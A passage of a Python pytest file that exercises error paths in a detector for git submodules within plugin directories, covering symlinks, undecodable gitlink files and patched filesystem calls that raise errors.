    detector._iter_submodules(symlink_git)

    rel_err = _pinned_plugin(tmp_path / "rel-err")
    nested = rel_err / "vendor" / "nested"
    nested.mkdir(parents=True)
    (nested / ".git").write_text(f"{_NESTED_SHA}\n", encoding="utf-8")
    original_relative_to = Path.relative_to

    def relative_to(self: Path, other, *args, **kwargs):
        if self.name == "nested" and "rel-err" in Path(str(other)).as_posix():
            raise ValueError("rel")
        return original_relative_to(self, other, *args, **kwargs)

    monkeypatch.setattr(Path, "relative_to", relative_to)
    detector._iter_submodules(rel_err)
    monkeypatch.setattr(Path, "relative_to", original_relative_to)

    decode_git = tmp_path / "decode-git"
    decode_git.mkdir()
    (decode_git / ".git").write_bytes(b"\xff\xfe")
    assert detector._gitlink_sha(decode_git) == ""

    linked = _pinned_plugin(tmp_path / "recorded-symlink")
    (linked / "vendor").mkdir()
    (linked / "vendor" / "nested").symlink_to(root)
    assert (
        detector._recorded_sha(
            linked,
            detector._SubmodulePointer(
                path="vendor/nested", file=".gitmodules", recorded_sha=""
            ),
        )
        == ""
    )

    plugin_dir_err = _pinned_plugin(tmp_path / "plugin-dir-err")
    _write_gitmodules(
        plugin_dir_err, "vendor/nested", "https://github.com/example/nested.git"
    )
    nested = _write_gitlink(plugin_dir_err, "vendor/nested", _NESTED_SHA)
    _write_nested_plugin(nested, _NESTED_SHA)
    original_is_dir = Path.is_dir

    def is_dir(self: Path) -> bool:
        if self.name == ".claude-plugin" and "plugin-dir-err" in self.as_posix():
            raise OSError("isdir")
        return original_is_dir(self)

    monkeypatch.setattr(Path, "is_dir", is_dir)
    assert (
        detector._submodule_is_admitted(
            plugin_dir_err,
            detector._SubmodulePointer(
                path="vendor/nested",
                file=".gitmodules",
                recorded_sha=_NESTED_SHA,
            ),
        )
        is False
    )
    monkeypatch.setattr(Path, "is_dir", original_is_dir)
